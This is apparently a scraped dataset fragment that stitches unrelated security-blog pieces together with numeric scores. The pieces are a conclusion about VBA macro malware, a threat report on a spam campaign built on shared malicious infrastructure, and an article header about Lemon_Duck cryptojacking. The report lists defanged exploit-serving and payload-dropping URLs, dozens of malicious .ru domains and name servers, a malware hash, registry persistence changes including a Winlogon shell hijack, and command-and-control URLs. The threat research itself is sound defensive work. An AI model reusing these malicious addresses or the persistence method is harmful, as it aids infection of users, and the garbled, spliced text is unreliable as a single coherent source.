https://www.virustotal.com/en/file/c85fe4874ddfa96845 69819db42fb321641088cbe15e6e54d28de49de26f155c/analysis/
A DotNET injector:
https://www.virustotal.com/en/file/f1b0432594bf9651ad 50d755fe1967fd2a16f112e5c0df6ebc5311166857d30c/analysis/
Old-fashioned RATs like Simda:
https://www.virustotal.com/en/file/f456df5aa1af278ccd9 958bf7f0b18ab36ed05ccb73aed8d7faec8a5898d8bcb/analysis/.",0.015055173122241805
"Conclusion
Our earlier report pointed out [1] that ordinary cybercriminals turned to Office exploits as an alternative delivery method for their creations. Current trends show that they have moved one step further into the Office realm: they have discovered the long-forgotten VBA macros and added them to their repertoire. This emphasizes the fact (I can’t even count how many times it has been proven in the past) that there is no need for fancy exploitation. When the aim is to infect a large number of users, good old social engineering never fails to deliver the results.
Finally, a piece of advice: there is no justification as to why the content of a document can only be displayed properly if the execution of macros is enabled. If you receive a document with this advice, be aware: you are probably being attacked.",0.009424700517922213
"Bibliography
[1] http://nakedsecurity.sophos.com/advanced-persistent-threats-the-new-normal.
[2] http://www.virusbtn.com/virusbulletin/archive/2014/04/vb201404-VBA.
",0.013113113726287429
"Over the last couple of days, we’ve been monitoring a persistent attempt to infect tens of thousands of users with malware through a systematic rotation of multiple social engineering themes. What all of these campaigns have in common is the fact that they all share the same malicious infrastructure.
Let’s profile one of the most recently spamvertised campaigns, and expose the cybercriminals’ complete portfolio of malicious domains, their related name servers, dropped MD5 and its associated run time behavior.
More details:",0.013707920714054023
Sample screenshot of the spamvertised email:,0.010990132234593664
"Sample spamvertised compromised URLs:
hxxp://2555.ruksadindan.com/page-329.htm
hxxp://www.athenassoftware.com.br/page-329.htm
hxxp://www.sweetgarden.ca/page-329.htm
hxxp://lab.monohrom.uz/page-329.htm
hxxp://easy2winpoker.com/page-329.htm
hxxp://ideashtor.ru/page-329.htm
Sample client-side exploits serving URL:
hxxp://202.72.245.146:8080/forum/links/public_version.php
The following malicious domains also respond to the same IP (202.72.245.146) and are part of multiple campaigns spamvertised over the past couple of days:
enakinukia.ru
dekamerionka.ru
evskindarka.ru
exibonapa.ru
esigbsoahd.ru
dmssmgf.ru
epianokif.ru
elistof.ru
dmpsonthh.ru
esekundi.ru
egihurinak.ru
exiansik.ru
ewinhdutik.ru
efjjdopkam.ru
eipuonam.ru
emaianem.ru
epionkalom.ru
disownon.ru
estipaindo.ru
ejiposhhgio.ru
epilarikko.ru
damagalko.ru
emalenoko.ru
epiratko.ru
evujalo.ru
bananamamor.ru
eminakotpr.ru
dfudont.ru
Related Name Servers (part of the infrastructure of these campaigns):
Name server: ns1.enakinukia.ru – 85.143.166.174
Name server: ns2.enakinukia.ru – 41.168.5.140
Name server: ns3.enakinukia.ru – 42.121.116.38
Name server: ns4.enakinukia.ru – 110.164.58.250
Name server: ns5.enakinukia.ru – 210.71.250.131
Name server: ns1.dekamerionka.ru – 62.76.185.169
Name server: ns2.dekamerionka.ru – 41.168.5.140
Name server: ns3.dekamerionka.ru – 42.121.116.38
Name server: ns4.dekamerionka.ru – 110.164.58.250
Name server: ns5.dekamerionka.ru – 210.71.250.131
Name server: ns1.evskindarka.ru – 85.143.166.174
Name server: ns2.evskindarka.ru – 41.168.5.140
Name server: ns3.evskindarka.ru – 42.121.116.38
Name server: ns4.evskindarka.ru – 110.164.58.250
Name server: ns5.evskindarka.ru – 210.71.250.131
Name server: ns1.exibonapa.ru – 85.143.166.174
Name server: ns2.exibonapa.ru – 41.168.5.140
Name server: ns3.exibonapa.ru – 42.121.116.38
Name server: ns4.exibonapa.ru – 110.164.58.250
Name server: ns5.exibonapa.ru – 210.71.250.131
Name server: ns1.esigbsoahd.ru – 62.76.40.244
Name server: ns2.esigbsoahd.ru – 41.168.5.140
Name server: ns3.esigbsoahd.ru – 110.164.58.250
Name server: ns4.esigbsoahd.ru – 210.71.250.131
Name server: ns5.esigbsoahd.ru – 203.171.234.53
Name server: ns1.dmssmgf.ru – 62.76.185.169
Name server: ns2.dmssmgf.ru – 41.168.5.140
Name server: ns3.dmssmgf.ru – 42.121.116.38
Name server: ns4.dmssmgf.ru – 110.164.58.250
Name server: ns5.dmssmgf.ru – 210.71.250.131
Name server: ns1.epianokif.ru – 62.76.40.244
Name server: ns2.epianokif.ru – 41.168.5.140
Name server: ns3.epianokif.ru – 110.164.58.250
Name server: ns4.epianokif.ru – 210.71.250.131
Name server: ns1.elistof.ru – 62.76.40.244
Name server: ns2.elistof.ru – 41.168.5.140
Name server: ns3.elistof.ru – 110.164.58.250
Name server: ns4.elistof.ru – 210.71.250.131
Name server: ns1.dmpsonthh.ru – 62.76.185.169
Name server: ns2.dmpsonthh.ru – 41.168.5.140
Name server: ns3.dmpsonthh.ru – 42.121.116.38
Name server: ns4.dmpsonthh.ru – 110.164.58.250
Name server: ns5.dmpsonthh.ru – 210.71.250.131
Name server: ns1.esekundi.ru – 85.143.166.174
Name server: ns2.esekundi.ru – 41.168.5.140
Name server: ns3.esekundi.ru – 42.121.116.38
Name server: ns4.esekundi.ru – 110.164.58.250
Name server: ns5.esekundi.ru – 210.71.250.131
Name server: ns1.egihurinak.ru – 85.143.166.174
Name server: ns2.egihurinak.ru – 41.168.5.140
Name server: ns3.egihurinak.ru – 42.121.116.38
Name server: ns4.egihurinak.ru – 110.164.58.250
Name server: ns5.egihurinak.ru – 210.71.250.131
Name server: ns1.exiansik.ru – 85.143.166.174
Name server: ns2.exiansik.ru – 41.168.5.140
Name server: ns3.exiansik.ru – 42.121.116.38
Name server: ns4.exiansik.ru – 110.164.58.250
Name server: ns5.exiansik.ru – 210.71.250.131
Name server: ns1.ewinhdutik.ru – 62.76.40.244
Name server: ns2.ewinhdutik.ru – 41.168.5.140
Name server: ns3.ewinhdutik.ru – 110.164.58.250
Name server: ns4.ewinhdutik.ru – 210.71.250.131
Name server: ns5.ewinhdutik.ru – 203.171.234.53
Name server: ns1.efjjdopkam.ru – 62.76.40.244
Name server: ns2.efjjdopkam.ru – 41.168.5.140
Name server: ns3.efjjdopkam.ru – 110.164.58.250
Name server: ns4.efjjdopkam.ru – 210.71.250.131
Name server: ns5.efjjdopkam.ru – 203.171.234.53
Name server: ns1.eipuonam.ru – 62.76.40.244
Name server: ns2.eipuonam.ru – 41.168.5.140
Name server: ns3.eipuonam.ru – 110.164.58.250
Name server: ns4.eipuonam.ru – 210.71.250.131
Name server: ns5.eipuonam.ru – 203.171.234.53
Name server: ns1.emaianem.ru – 62.76.40.244
Name server: ns2.emaianem.ru – 41.168.5.140
Name server: ns3.emaianem.ru – 110.164.58.250
Name server: ns4.emaianem.ru – 210.71.250.131
Name server: ns1.epionkalom.ru – 62.76.40.244
Name server: ns2.epionkalom.ru – 41.168.5.140
Name server: ns3.epionkalom.ru – 110.164.58.250
Name server: ns4.epionkalom.ru – 210.71.250.131
Name server: ns5.epionkalom.ru – 203.171.234.53
Name server: ns1.disownon.ru – 62.76.185.169
Name server: ns2.disownon.ru – 41.168.5.140
Name server: ns3.disownon.ru – 42.121.116.38
Name server: ns4.disownon.ru – 110.164.58.250
Name server: ns5.disownon.ru – 210.71.250.131
Name server: ns1.estipaindo.ru – 62.76.40.244
Name server: ns2.estipaindo.ru – 41.168.5.140
Name server: ns3.estipaindo.ru – 110.164.58.250
Name server: ns4.estipaindo.ru – 210.71.250.131
Name server: ns1.ejiposhhgio.ru – 62.76.40.244
Name server: ns2.ejiposhhgio.ru – 41.168.5.140
Name server: ns3.ejiposhhgio.ru – 110.164.58.250
Name server: ns4.ejiposhhgio.ru – 210.71.250.131
Name server: ns5.ejiposhhgio.ru – 203.171.234.53
Name server: ns1.epilarikko.ru – 85.143.166.174
Name server: ns2.epilarikko.ru – 41.168.5.140
Name server: ns3.epilarikko.ru – 42.121.116.38
Name server: ns4.epilarikko.ru – 110.164.58.250
Name server: ns5.epilarikko.ru – 210.71.250.131
Name server: ns1.damagalko.ru – 62.76.185.169
Name server: ns2.damagalko.ru – 41.168.5.140
Name server: ns3.damagalko.ru – 42.121.116.38
Name server: ns4.damagalko.ru – 110.164.58.250
Name server: ns5.damagalko.ru – 210.71.250.131
Name server: ns1.emalenoko.ru – 62.76.40.244
Name server: ns2.emalenoko.ru – 41.168.5.140
Name server: ns3.emalenoko.ru – 110.164.58.250
Name server: ns4.emalenoko.ru – 210.71.250.131
Name server: ns1.epiratko.ru – 85.143.166.174
Name server: ns2.epiratko.ru – 41.168.5.140
Name server: ns3.epiratko.ru – 42.121.116.38
Name server: ns4.epiratko.ru – 110.164.58.250
Name server: ns5.epiratko.ru – 210.71.250.131
Name server: ns1.evujalo.ru – 85.143.166.174
Name server: ns2.evujalo.ru – 41.168.5.140
Name server: ns3.evujalo.ru – 42.121.116.38
Name server: ns4.evujalo.ru – 110.164.58.250
Name server: ns5.evujalo.ru – 210.71.250.131
Name server: ns1.bananamamor.ru – 62.76.186.24
Name server: ns2.bananamamor.ru – 41.168.5.140
Name server: ns3.bananamamor.ru – 42.121.116.38
Name server: ns4.bananamamor.ru – 110.164.58.250
Name server: ns5.bananamamor.ru – 210.71.250.131
Name server: ns1.eminakotpr.ru – 62.76.40.244
Name server: ns2.eminakotpr.ru – 41.168.5.140
Name server: ns3.eminakotpr.ru – 110.164.58.250
Name server: ns4.eminakotpr.ru – 210.71.250.131
Name server: ns5.eminakotpr.ru – 203.171.234.53
Name server: ns1.dfudont.ru – 62.76.185.169
Name server: ns2.dfudont.ru – 41.168.5.140
Name server: ns3.dfudont.ru – 42.121.116.38
Name server: ns4.dfudont.ru – 110.164.58.250
Name server: ns5.dfudont.ru – 210.71.250.131
Sample malicious payload dropping URL:
hxxp://202.72.245.146:8080/forum/links/public_version.php?mmltejvt=1g:2v:33:2v:2w&pstvw=3d&xrej=1j:33:32:1l:1g:1i:1o:1n:1o:1i&vczaspnq=1n:1d:1f:1d:1f:1d:1j:1k:1l
Sample client-side exploits served: CVE-2010-0188
Upon successful client-side exploitation, the campaign drops MD5: 04e9d4167c9a1b82e622e04ad85f8e99 – detected by 31 out of 46 antivirus scanners as Trojan.Win32.Yakes.cdxy.
Once executed, the sample creates the following Registry Keys:
HKEY_LOCAL_MACHINESYSTEMControlSet001ControlMediaResourcesmsvideo
HKEY_LOCAL_MACHINESYSTEMCurrentControlSetControlMediaResourcesmsvideo
HKEY_CURRENT_USERSoftwareMicrosoftMultimediaDrawDib
And modifies them in the following way:
[HKEY_CURRENT_USERSoftwareMicrosoftMultimediaDrawDib] -> vga.drv 640x480x32(BGR 0) = “31,31,31,31”
[HKEY_CURRENT_USERSoftwareMicrosoftWindows NTCurrentVersionWinlogon] -> shell = “explorer.exe,%AppData%skype.dat”
Once executed, the sample phones back to the following URLs:
hxxp://gpbxn.ru/rzprxtgxtyebms-qtda-nmxt-ndfvohvndd-cbdh-qtorpp-fprg-sdqj-yszh-vnamvylalipbpyykeawkdastftukky.php
hxxp://jhlxk.su/oyxioyxi-oyxioyxibcvnosrqqrprar-nbjk-ndelquqjoheyowmsndxp-ltwgysxixsnnceksdm_rzbi_aumr-ysix.php
hxxp://gpbxn.ru/itqukqcbkydftmysmrrqfqnbptfpxlyedapffv-uqxfakkoqp-orzmsd-cupz-atqc_ybeh_ohtfsi-ykjz_prdmuq-yk.php
hxxp://jhlxk.su/cnpmezeamv-kort-ioou_wkzjvr-alpb-cuqsfv-lipt_nhuk-jzgx-acix_abgn-fvca-oept-zhgjtmqtdnkg-pvzo-zauuqk-.php
hxxp://gpbxn.ru/rkow-pvpz-turnndgkgnrueglazvrdqzmvdhsukgcuzjyxofuynn-kkhj-wpli-lxca-auwbybppplyjouiivnno_xf.php
hxxp://jhlxk.su/qnjt-ixjxqnjtixjxyeppoycn-qzgb-gbihspkftiqu-syqtdhxydk_zozm_dkgbsprnxljz-quplhcpixo-rzdm-zvyx-.php
hxxp://gpbxn.ru/rnnd-gkjkpp-phacuypfsrhcawshpi-prmx-nfuyqzdnxopygt-pyko-acus-tugaxfiqegybqcdheabi-zmiirkculi.php
hxxp://jhlxk.su/my-nsoe-exjlbwipnafquq-nbqk-cglx-cexcdaykcn_baohzaiirkfy-qzdn-gdva_yhlzif-jtca-cgclrcnlgkpvfcxx.php
hxxp://gpbxn.ru/piqjteitqukqcbkyvyteptofxpxsyerksrfmvp-jpjxej-uswi-kkjl-xytewpegnezjsuon-ownq-xcbt_xqyb_uxeh.php
hxxp://jhlxk.su/lajutfofnoygfq-uomyor-lxpqnqwpzvawsn-kyst-nfmpmpsuarkdsulz-lgtmnwabjtcj-aueblmifioiqvkoarn.php
hxxp://gpbxn.ru/ebmsqtusqzukwgrgky-shpicusygkppuavaca-cnfq-ddsu_ynorjkllgoon-juns-goyhcgyjzmlg-rzpq-qpjt_xvuq.php
hxxp://jhlxk.su/ip-nadw-wipqne-ytmx_bldr-lzht-cjro-lgty-qcky-coprzrjwalpz-myteez-owwk-suab_bcjt_nojt_ysnakb-jkos-fyzj-.php
hxxp://gpbxn.ru/vy_vlcu-opvk-dgks-babc-ixgsuy-nqey-cjjh-eaxtzriioasd-jgnd_rcea_fcoudf-kktiezfpwp-phon_jtea_dgamzhga.php
hxxp://jhlxk.su/hjyqybti-sddn-xocq-ohlx-osgt-gdhcrnyqvqukclyx-fyjk-oxoy-nwsn_oxmr_glwk-nmqn-vyac-pbrtmyvafappnlea.php
hxxp://gpbxn.ru/igyhva-xlsyft-xplx-rizh-yszn-ltli-wpnstmspdanqmy_qsqj-cqjkfzgdwfuy-garalabwyear_ouabdhldcbuqjp.php
hxxp://jhlxk.su/jutf-ofnoygfquobi-jtbilmrdpixp-pabcdnstos-dhti_ohjp_pyqt-mvkdsiqttykfgs-lirkfc-zhxl-gjyhzvhelx.php
hxxp://gpbxn.ru/pt-ptptptptptptptuqmpbhjlstusplfmgtdh_xyuyms-ofvizovqqcxohemp-mpzv-vlit-nhne_htuqvl-yxph-zjuu-.php
hxxp://jhlxk.su/ipna-dwwi_pqneytmxbldrlzht-cjro-lgtyqckycoprzrjwalpzmyte-ezowwk-suabbcjtno-jtys-nakb-jkos-fyzj-.php
hxxp://gpbxn.ru/uqfplgsncexczjddtybaonfcybioiisimyprmvxvea-laxvjvfzpv-oatu-gdoe-bafrqkstkgowitbfblsujguo-.php
hxxp://jhlxk.su/sncexczjddongdqkpaoyvnxtdm-qtqu-yvvpbtgxfrynwg_dkspqposoaohqt-ouvqtixoxxvacg-xqte_ofzj-xcfr-.php
hxxp://gpbxn.ru/mpfmgnlt-blcrkgoxopelar-uaop-vtrp-lmcd-juosvalzoaqt-xplx-siwkcokqnssu_nskq_uavi_jhvpca-owdgab-jz.php
hxxp://jhlxk.su/bihc-kkrq-shgscdnbuulx-qcipvtcaaw-lxzm_ygxt-ygyxpacenosdvybhnbwinaixoykdxqduxpdunwnhxlyvbi.php
hxxp://gpbxn.ru/cd-nbvpherovnvy-vlxsrnitlzorjthtldkoxqfccd-frjuzmgtjp-dmbc-bwau-bccdsnohezwidmduqtzhbqrn-nn.php
hxxp://jhlxk.su/vqsrznyjbqricoarxplasiuu_fqye_dfuq-qcrtddfzroxowgowix-ygnmllrpabus-gkfzjxoxjxopplitzvkfla.php
hxxp://gpbxn.ru/nfwfmrhttwwp-wbjg_bwms-iqdwqcliop-nlos-qpuanfmrndzo-kots-ppjt-akzmgncjgdorouohabfv-bhhtrpaccn.php
hxxp://jhlxk.su/jkpp-phacuyqckfouvlznkg-rquxjgstybditmbwtmixacyehe-uaejcbvpxfjkgdgxiffzxtfaebbwviqj-qsip-.php
hxxp://gpbxn.ru/zh-rubt-oahjyqybtiybnesncnofstdforqn-awpf-ptcqfmsuqzgdlxusif-ftybuozacnvnsnosnfnaneye_akea.php
hxxp://jhlxk.su/ppph-acuy-qckfougjlznw_bipbnf-ifgdvylzshsdigsuuynmqrybptzm_kkxttm-ioqsfyrchcvrop-kdip_oajvpi.php
hxxp://gpbxn.ru/zv-yxpajheluqfp-lgii-ynyvvpjkoaeg-ksxi-tsioygzrxcytvqzvhezmjtmppftmosit_qrks_xotf_ptnaqugbcq.php
hxxp://jhlxk.su/itqukqcbkydf-tmysmr-rqfq-nbpt-fpxl_yeda_pffv_uqxfak-koqporzmsdcupzatqcybehohtfsiykjzprdm-uqyk.php
hxxp://gpbxn.ru/zmfrqsrafyabdiii-xpkkxj-exsu-pbbtuk-oait-llar_rukf_jtsi_yttsjw-fvfr-qzsplgtuosdwjh-ruyb-rtne-kgif-.php
hxxp://jhlxk.su/oa-hjyqybtisddnxojgtskorpvqvrdgksauqkddxxrc-elpaehsdceal-alfz_oyoamr-dgqs_xjyt-cnxignohzhqt.php
hxxp://gpbxn.ru/vl-cuopvkdgksba_fvux-ytfpygzvbtbidg-dadrlxacmxjponvtfvcbfr-dnprauzmsrnfdk-ltju-alkbpqxlcqll.php
hxxp://jhlxk.su/mynsoeexjlbwip-nafquqnbqkcglxcexcda_ykcn_baohza-iirkfyqzdngdva-yhlzifjtcacgcl-rcnl_gkpvfc-xx.php
hxxp://gpbxn.ru/ux-mpfmgnltblcrkg-tinf-rpty-jhynuyhctycuzmtfzmspatipky-qkmrtuauzallcj-kqftkytwmrgl-zvfvey-sy.php
hxxp://jhlxk.su/ougjyv-xvak-uakbegmvezzafabieyoszmpfnwcb-tmgari-tyrnjzcaqsgs_mswfnd-dhkqzv-snptpynqldbqioxt.php
hxxp://gpbxn.ru/uxmpfmgnltbl-crkg-tinfrptyjhyn-uyhcty-cuzm-tfzmspatipkyqkmrtuauzallcjkqftky-twmrglzvfveysy.php
hxxp://jhlxk.su/ar-zmfr-qsra-fyabdimvzvmsyxuojz-laebalcuzryeyeuqrnrk-pyzj-fzqnqkzadiihtugoxl-tufthealmsvasn.php
hxxp://gpbxn.ru/sddn-xocq-piqjteitdwyvfmatqc_akgn-xqsnmxqzcahtjzyjftznqz-yjor-kdrqdrakvyms-cbdwrncolljhjuam.php
hxxp://jhlxk.su/vaxlsyft-xplx-stzhit-qnzn-vaea-wfbwihytzjfp-ehehnlhtiivy-zjcaorjzyttempli_kovy_pfkddk-abht-opxf-.php
hxxp://gpbxn.ru/wfmrht-twwp-wbjgnfgnebwbjpkoxc-prkdyv-jptm_ejzh_pyxoehpvgkbh_jhgkdivqzaoygsammxakdw_fmixzoez.php
hxxp://jhlxk.su/kk_rqshgs-cdnb-vphe-rprd_pqez_bwalbquqjtradnejtsak-lamsfvqcmrejifqkbtkfeh_prnbuk-ykzo-zjkf-viyh.php
hxxp://gpbxn.ru/xyawrkowpvpztu-rnjp-cjopouzasnxcjgyjiogbna_nnix_xtkbcu-bijgbqjxvtositpzxypq-gapvejrdmyoxfy.php
hxxp://jhlxk.su/ih_zovr_dmih-zovrdmxcnwrialroju-iocu-rulaga-gbeh-kqnornvionpisyspxqruyeyvpixlvifmft-kygkawjx.php
hxxp://gpbxn.ru/teitqukqcbkydftm_htra_eygo-usgnlmzhtevlrk-owxyiojuehcj-wksh_auoy-rpbajxrocgdrvajxitlidr-exip_.php
hxxp://jhlxk.su/mynsoeexjlbwipnafq_uqnb-qkcg-lxce_xcda_ykcnba-ohzaiirkfy-qzdngdvayhlzifjtcacgclrcnlgkpvfcxx.php
hxxp://gpbxn.ru/kq-cbky-dftmys-glga_ohtm-vrqswprpvqmslmatdwgtzmbhkggtukuu-cbyt-yquu-wfptjkpflxmxkq-qjllhcrgko.php
hxxp://jhlxk.su/ygfquobihc-kkrq-shjppf-ifytxf-wixv_gtxp-bfceoxyvht-ddshqs-pbfq_rcli-gbalxcauriebhtxyqkwfprwgkd.php
hxxp://gpbxn.ru/opvk-dgksbafvsudu-jhvinsrogojlnhsikgofgbuyqkkfrixvfrdmvnsuhtehifnsky-jxwk_dniiys-bwraeb-of.php
hxxp://jhlxk.su/exjlbwip-nadwwipqrqtswblmfp-vifayqwfioxtyquabi-cnfm-osel-fcli_rqjtearzhcac-vkoaxqpypp-qnnnlm-.php
hxxp://gpbxn.ru/vaxlsyftxplxstzhitqnzn-vaea-wfbwihytzjfp-eheh-nlhtiivyzjcaorjzytte_mpli_kovypf-kddk-abht-opxf-.php
hxxp://jhlxk.su/ifej_dapl_jvzvyxpaoaih_pqgx_ipiisilipmohowoewiacxxplshsntiuoxopyhelisybhsn-kkms-vlbc-ukmxfp.php
hxxp://gpbxn.ru/ygfquobihckk-rqshjppfifytxf-wixvgtxpbfceoxyvhtdd_shqspbfqrcligbalxcauriebhtxyqkwfprwgkd.php
hxxp://jhlxk.su/lz-lipbux-mpfmgnltwpdmmpli_dudf-tfih-oari_bhgo_elixawdnrgcdzjra-jgsd-yjnw-korojuysdh-ykpynekqlt.php
hxxp://gpbxn.ru/bqricoarzmfrqsracewg-paruoxhjmy-oxvi_ptopbajpehgsnl-culg-eaxfli-lagdcaptrgfq_itvasd-gtwk-gaqn-.php
hxxp://jhlxk.su/jgnf-wfmrhttwwp-wbxo_hjii-xfbh-kqfcjujkgacg-zngt-vnce-xvwkjwnsgd-godu-pmqzceftrgcrkqjgdgnn_mxfq-.php
hxxp://gpbxn.ru/noygfquobihckkrqwfuocllgdh-zrouipdurqlililakyzvsrcjjurqxopfipauabqu-wfba-kbegzjyvqjbhvl.php
hxxp://jhlxk.su/gjyv-xvakuakbeg-nldg_zmexcunhwiosxfsugspqearomy_pycu-dwys-xvvykseyfr_spuq_dnfc_osjthtllkdonxj.php
hxxp://gpbxn.ru/kfougj-yvxv_akuakbigohzhxowiezzjbigddh-ytxsbwexsy-exdmcbatehgnyqcnjxsujl_hjpzglfpzhdkkb-ih.php
hxxp://jhlxk.su/nnrpfaau-xfjwbheynblxqt-gofqtmqcnmignhhceluujgaclzvpawyvpikykqykoullzvlzclbteh-nliivqoy.php
hxxp://gpbxn.ru/kydf-tmysglgajzqrdrtwjtqtoehjnlllzvuastnsmrakiixcsuxscqrdgoppjxoreakq-mytsamwfpq-qczjgj.php
hxxp://jhlxk.su/opvkdgksbafvsudujh-vins-rogo-jlnhsikgofgbuyqkkfrixvfrdmvnsuhtehifnskyjxwkdn-iiys-bwra-ebof.php
hxxp://gpbxn.ru/on-gdqk-kdvttsorqpamqp_zvysxs-nmqc-rgyx-fvhj-zrrnbtatfcqcawquvkwfej-gncjit-vtsn-fqpi-bcyn-yxclgb-.php
hxxp://jhlxk.su/hjyqybtisddnxocqohlxosgtgdhcrnyqvqukclyx-fyjkox-oynwsnoxmrglwknmqnvyacpbrtmyvafa-ppnl-ea.php
hxxp://gpbxn.ru/kb_egnlxj-igyh-vaxltyegnwtwykyhtsifoegdglxf-xixliquqdnqpfcxpfapf-ebvl_earqqu-lmmsqp-kfnemynd.php
hxxp://jhlxk.su/nwamrdmynsoeexjlliiolt-bqvnebpytico_oxua-egig-linbllcornxjowzrgkrztuexux-ebop-qnjxaratuqvi.php
hxxp://gpbxn.ru/nn_rpfaau-xfjwbheynblxqtgo-fqtm-qcnm-ignh-hcel-uujgaclzvpawyvpikykqykoullzvlz-clbtehnliivqoy.php
hxxp://jhlxk.su/ba-fvsuducalaju-tfig_ampvkqyxfyuu-uszvbc-nodkjkdusp-rtla-xcey-amlm-jwzmdiuonfno-xjglvlusigtfpm.php
hxxp://gpbxn.ru/yvxvakuakbeg_nlxj_caoy_vpkdjxqsdfnwfzhecoshegussi-dkcr-nfjw-cjfm-btii_fqjgxq-jvftqr-rduqjzoapb.php
hxxp://jhlxk.su/dg_ksba_fvsu_duca_layxlitmuqxoynfqpmpf_xvty-rceacdcnrq-vnco-rkwb_nqyt-blfvukoftwks-cjlauu-eaqp-mv.php
hxxp://gpbxn.ru/bcgocnpmez-eamv-kons-ksaw_yjvl-xpyb-gkjw-nwjukbcbsh_bqfy_ebxoyv-ykbqatdirkoejtqj_pbpq_lzdk-jkrq-bh.php
hxxp://jhlxk.su/amrdmy-nsoeex-jlbwndftcajvgnabjgfqvtsnfc-nhyt_gtejshfcdgsu-rnuypzduns_egye-mpgojhoekfnnyjhc-.php
hxxp://gpbxn.ru/bafvsuducala-jutf-igampv-kqyxfyuuuszvbcnodkjkdusprtla-xceyamlmjwzmdiuonfnoxjglvlus-igtfpm.php
hxxp://jhlxk.su/owpvpzturn-ndgkjkdhro_fyfzzokbofoaxlbfonsngbkdwgbl-ofqzfmoakf-yjqr-dfro_osvl-rggbouplallt-rg.php
hxxp://gpbxn.ru/yv_xvakuakbegnlxj_caoy_vpkdjx-qsdfnw-fzheco-sheg-ussi-dkcr_nfjw-cjfm-btii_fqjg-xqjvftqrrduq-jzoapb-.php
hxxp://jhlxk.su/gocnpm_ezea_mvkortcdranq-jvtuqjuodmbqiifpca-dwptpqpioa_xcsh-lxgbmrwigbakpvrg-pisyegnoxymp_ru.php
hxxp://gpbxn.ru/xo-cqpi-qjteitqukqrz-zjqrxfxqgjuy-cnns_ihuo_nlxxda-oukk-tsbauq-uykb_uudi-bwiqbwynof-jkuo-znawkgux.php
hxxp://jhlxk.su/bqricoarzmfrqs-racewg-paru-oxhjmy-oxviptopbajpeh-gsnl-culgeaxflilagdcaptrg-fqitvasdgt_wkga_qn.php
hxxp://gpbxn.ru/egnl-xjig-yhva_xlsy_uyruvr-uoyq-pyrp-ynht-gkce-cejkbhmsxliq-phatlzgnfcxlpa-fzxp-ukwbeayhrkzmnlit.php
hxxp://jhlxk.su/ndgkjkppphacuyqcipduyhmy-ladr-fcbayh-cdcn_tmppft-gxyt-pvvkkkrqartsorquxxrannygiicnkfyq-owjv.php
hxxp://gpbxn.ru/calajutf_ofnoyg-fqih-wgti-ehjg-ybdm-jvcaru-tmwiybnsnb-jzey_mrowxl-bljh_jlpm-bfof-gsnq-cncq-ybzm-fyvr.php
hxxp://jhlxk.su/ihzo-vrdmihzovrdmxc-nwrialroju-iocurulagagbeh-kqnornvion_pisy-spxq-ruyeyvpixlvi-fmftkygkawjx-.php
hxxp://gpbxn.ru/rd-mynsoeexjlbwiptivtynddlgcdllusmrqngkac-pzjwjwblpaihkq-lgmpifiqbans-almrtiplop-ybsd-xpuo-.php
hxxp://jhlxk.su/wkcl-albc-gocnpmezsycqxqftuy-tuqz-qkampyytcbfmio-pikq-xilmpaihcagbmpzayv-ytvq_vayx_cjxjjz-jxdw.php
hxxp://gpbxn.ru/atrz_prxtgxtyebmsjwop-phkd-dayedavyqsyx-mxmy-kodw-ndfclldadrna-ebybtsqnrkifcojzqsbwuq-xfheuy.php
hxxp://jhlxk.su/rafy-abdi_iiye_ohif-syph-vtmvyjohhetmnolg_kopvqkfzgoejaw-qrvl-fyuumvawph_vrwkvliimpuqwbfyraht-.php
hxxp://gpbxn.ru/btoahjyq-ybti-sddn-tugl-koty-nbvq-dfjvrodhejgajxkqpaoaspnbkkkfcartgxnexozhoyuarg_nlpa_expq-rt.php
hxxp://jhlxk.su/rp-faau-xfjw-bhey_vixv-rpld-vripyh-cgvicq-orcjam-awegihrgyqphvp-kbam-qtvq-fykq-jubqlxfysusivqht-ft.php
hxxp://gpbxn.ru/rnnd-gkjkppphacuypfsrhcawsh-pipr-mxnfuyqzdnxo-pygt-pykoacustu_gaxf-iqegybqcdheabizmiirkculi.php
hxxp://jhlxk.su/uobihckkrqsh_gscdpt-yxuu-spwi-xitept-gngauomsvamrph-hcmypy-ldnn-rnzrkyjkosel-mpoujuvtsidizjkf.php
hxxp://gpbxn.ru/my-nsoe-exjl-bwipnafquqnbqkcglxcexc-daykcnbaoh_zaiirk-fyqz-dngdva-yhlzif-jtca-cgcl_rcnlgk-pvfc-xx.php
hxxp://jhlxk.su/jpfc-gtdh-xsdknqzapzvqzrteejixuaplpbtivpcjvpyh-qkeb_sdnoqr-oeca-biorehsrbt-ehuy-tmybza-wipfcj-.php
hxxp://gpbxn.ru/fplgsncexc_zjddonjufzna-gdfrtycjukonxvruuqawpmti-yjnawbgarc-xcsh-rgqzzvjlexrkmxzofckgdi-di.php
hxxp://jhlxk.su/duca-laju-tfofno-ygsi-exnd-wfjt-banafqpbpmos_oskyaknstiqtehjziqukfqltba-ykmvnniosdlzzncg-fqju-.php
hxxp://gpbxn.ru/akua-kbegnl-xjig-yhclpq-sypa-runo-plpmcq-gadk-ruramrkdvnfq-ohjh-mvxleg-ukcdsy-ofox-onqz-syqt-ksxf-ts.php
hxxp://jhlxk.su/dftm-ysglgajzqrpftfoaxj-fzco-uofp-dwon-jtrpqtnmlllxoeuoga-itwk-rngkfrzrxpptcqfcuujplixc-ykvr.php
hxxp://gpbxn.ru/rq_shgscdnbvphero-pyga_vnnete-fmkk_rgiivkfaxjfpejoy-bczokqatno-mvdk-zmbf-cbtf_itnsxoqznenopl-vq.php
hxxp://jhlxk.su/jxqn_jtixjxqnjtixjkcqstll-elvpgn-jplikqbluu-dicbukitiokq-xonh-iioynovnbqtedd_xlbt_jtwi-ipmyal.php
hxxp://gpbxn.ru/calajutfofnoygfqihwgtiehjgybdmjv-caru_tmwi_ybnsnb-jzeymrowxlbljhjlpmbfofgsnqcn-cqybzmfyvr.php
hxxp://jhlxk.su/bihckkrqshgs-cdnb_uulx_qcipvtcaawlxzm-ygxtygyxpace-nosdvybhnbwinaixoykdxqduxpdu-nwnh-xlyv-bi.php
Webroot SecureAnywhere users are proactively protected from these threats.
You can find more about Dancho Danchev at his LinkedIn Profile. You can also follow him on  Twitter.
",0.01485149307747613
PRODUCTS & SERVICES,0.010734820384793453
Lemon_Duck PowerShell malware cryptojacks enterprise networks,0.009053462153221892
"Written by
Rajesh Nataraj,",0.011249403735729469
"Vikas Singh,",0.009675163648324436
Michael Wood,0.00861273130666651
"October 01, 2019",0.009002674299731228
Products & Services SophosLabs Uncut Threat Research cryptojacking Cryptomining EternalBlue fileless Lemon_Duck Powershell SMB,0.007859385359117677
